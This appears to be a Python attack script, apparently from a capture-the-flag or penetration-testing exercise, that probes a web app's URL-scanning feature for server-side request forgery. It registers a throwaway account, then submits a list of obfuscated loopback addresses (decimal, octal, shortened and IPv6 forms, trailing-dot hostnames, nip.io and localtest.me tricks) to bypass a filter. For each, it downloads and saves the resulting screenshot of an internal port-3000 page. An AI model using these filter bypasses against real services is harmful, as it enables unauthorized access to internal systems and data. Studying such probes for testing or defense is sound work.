import sc, re, time, hashlib
U = sc.U
u = 'zz'+sc.rnd(6); s,_ = sc.register(u); sc.login(s,u)
def scan(target):
    r = s.post(f'{U}/scan', data={'url': target}, timeout=90, allow_redirects=True)
    if '/result/' not in r.url:
        return dict(ok=False, code=r.status_code)
    t = re.sub(r'<[^>]+>',' ',r.text); t=re.sub(r'\s+',' ',t)
    files = re.search(r'Files fetched\s*(\d+)', t)
    shot  = re.search(r'/screenshots/([0-9a-f-]+\.png)', r.text)
    png=None; dg=None
    if shot:
        img = s.get(f'{U}/screenshots/{shot.group(1)}', timeout=30)
        png = len(img.content); dg = hashlib.sha256(img.content).hexdigest()[:10]
        open(f'shot_{shot.group(1)}','wb').write(img.content)
    return dict(ok=True, files=(files.group(1) if files else None), png=png, sha=dg)
TARGETS = [
 'http://localtest.me:3000/profile',          # known-good loopback baseline
 'http://localhost:3000/profile',
 'http://127.0.0.1:3000/profile',
 'http://127.1:3000/profile',
 'http://0.0.0.0:3000/profile',
 'http://[::1]:3000/profile',
 'http://2130706433:3000/profile',
 'http://0177.0.0.1:3000/profile',
 'http://LOCALHOST:3000/profile',
 'http://localhost.:3000/profile',
 'http://localhost.localtest.me:3000/profile',
 'http://127.0.0.1.nip.io:3000/profile',
 'http://spacecheck.localtest.me:3000/profile',
]
for t in TARGETS:
    print(f'  {t:<46} ->', scan(t), flush=True)
    time.sleep(1)
